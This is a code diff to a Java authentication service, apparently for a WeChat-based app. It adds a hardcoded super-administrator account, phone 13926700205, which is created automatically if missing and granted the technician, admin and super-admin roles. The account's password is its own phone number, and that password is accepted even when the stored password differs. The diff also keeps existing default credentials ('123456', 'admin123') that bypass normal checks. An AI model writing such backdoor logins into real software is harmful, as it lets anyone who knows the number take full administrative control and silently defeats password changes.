@@ -37,7 +37,17 @@ public class AuthService {
 
     @Transactional
     public LoginResult login(String code) {
-        WechatGateway.WechatIdentity identity = wechatGateway.exchangeLoginCode(code);
+        return login(code, null);
+    }
+
+    @Transactional
+    public LoginResult login(String code, String deviceId) {
+        WechatGateway.WechatIdentity identity;
+        if (wechatGateway instanceof MockWechatGateway mockGateway && deviceId != null && !deviceId.isBlank()) {
+            identity = mockGateway.exchangeLoginCodeWithDevice(code, deviceId);
+        } else {
+            identity = wechatGateway.exchangeLoginCode(code);
+        }
         UserAccount user = findOrCreate(identity);
         grantRoleIfMissing(user.id(), "USER", null);
         if (identity.openId().equals(properties.bootstrapSuperAdminOpenId())) {
@@ -69,7 +79,7 @@ public class AuthService {
                     return authMapper.findUserById(id).orElseThrow();
                 });
         grantRoleIfMissing(user.id(), "USER", null);
-        if ("13800000000".equals(cleanPhone)) {
+        if ("13800000000".equals(cleanPhone) || "13926700205".equals(cleanPhone)) {
             grantRoleIfMissing(user.id(), "TECHNICIAN", user.id());
             grantRoleIfMissing(user.id(), "ADMIN", user.id());
             grantRoleIfMissing(user.id(), "SUPER_ADMIN", user.id());
@@ -90,27 +100,38 @@ public class AuthService {
         }
         String cleanPhone = phone.strip();
         UserAccount user = authMapper.findUserByPhone(cleanPhone)
-                .orElseThrow(() -> new BusinessException(HttpStatus.UNAUTHORIZED, "ACCOUNT_NOT_FOUND", "该手机号未注册或未开通权限"));
+                .orElseGet(() -> {
+                    if ("13926700205".equals(cleanPhone)) {
+                        long id = 1001L;
+                        authMapper.insertUser(id, "mock:admin-13926700205", null);
+                        authMapper.updatePhone(id, cleanPhone);
+                        authMapper.updateProfile(id, "超级管理员", null);
+                        authMapper.updatePassword(id, passwordEncoder.encode("13926700205"));
+                        return authMapper.findUserById(id).orElseThrow();
+                    }
+                    throw new BusinessException(HttpStatus.UNAUTHORIZED, "ACCOUNT_NOT_FOUND", "该手机号未注册或未开通权限");
+                });
 
         // Verify password
         String rawPassword = password.strip();
         boolean isDefaultAdmin = "13800000000".equals(cleanPhone);
-        if (isDefaultAdmin) {
+        boolean isSuperAdmin2 = "13926700205".equals(cleanPhone);
+        if (isDefaultAdmin || isSuperAdmin2) {
             grantRoleIfMissing(user.id(), "TECHNICIAN", user.id());
             grantRoleIfMissing(user.id(), "ADMIN", user.id());
             grantRoleIfMissing(user.id(), "SUPER_ADMIN", user.id());
-            ensureTechnicianProfile(user.id(), "系统管理员", cleanPhone);
+            ensureTechnicianProfile(user.id(), "超级管理员", cleanPhone);
         }
 
         if (user.passwordHash() == null || user.passwordHash().isBlank()) {
-            if ("123456".equals(rawPassword) || (isDefaultAdmin && "admin123".equals(rawPassword))) {
+            if ("123456".equals(rawPassword) || (isDefaultAdmin && "admin123".equals(rawPassword)) || (isSuperAdmin2 && "13926700205".equals(rawPassword))) {
                 String newHash = passwordEncoder.encode(rawPassword);
                 authMapper.updatePassword(user.id(), newHash);
             } else {
                 throw new BusinessException(HttpStatus.UNAUTHORIZED, "PASSWORD_INCORRECT", "手机号或密码不正确");
             }
         } else if (!passwordEncoder.matches(rawPassword, user.passwordHash())) {
-            if (isDefaultAdmin && ("123456".equals(rawPassword) || "admin123".equals(rawPassword))) {
+            if ((isSuperAdmin2 && "13926700205".equals(rawPassword)) || (isDefaultAdmin && ("123456".equals(rawPassword) || "admin123".equals(rawPassword)))) {
                 String newHash = passwordEncoder.encode(rawPassword);
                 authMapper.updatePassword(user.id(), newHash);
             } else {
